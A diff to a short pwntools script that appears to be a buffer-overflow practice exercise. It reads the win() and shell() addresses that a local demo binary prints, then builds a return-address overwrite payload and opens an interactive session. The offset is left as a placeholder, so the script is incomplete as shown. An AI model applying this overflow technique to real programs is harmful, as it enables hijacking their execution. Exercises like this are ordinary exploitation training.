@@ -1,23 +1,22 @@
 from pwn import *
 
-executable_name = "./a.out"
-
-
-# objdump -d a.out
-# 0000000100000e80
-# elf = ELF(executable_name)
-win = 0x0000000100000e80
-
+executable_name = "./demo-mac"
 p = process(executable_name)
 
-offset = 76
-payload = flat({offset: p64(win)})
 
-# log.info(p.recvline())
+log.info(p.recvuntil(b"Address of win() function: "))
+win_address = int(p.recvline(), 16)
 
-# buffer_length = 300
-# payload = b"A" * buffer_length + b"\x37\x13\x00\x00"
-# print(f"payload: {payload}")
+log.info(p.recvuntil(b"Address of shell() function: "))
+shell_address = int(p.recvline(), 16)
+
+print(f"win_address: {hex(win_address)}")
+print(f"shell_address: {hex(shell_address)}")
+offset = ?????
+
+payload = flat({offset: p64(win_address)})
+payload = flat({offset: p64(shell_address)})
+
+print(f"payload: {payload}")
 p.sendline(payload)
 p.interactive()
-# # p.interactive()
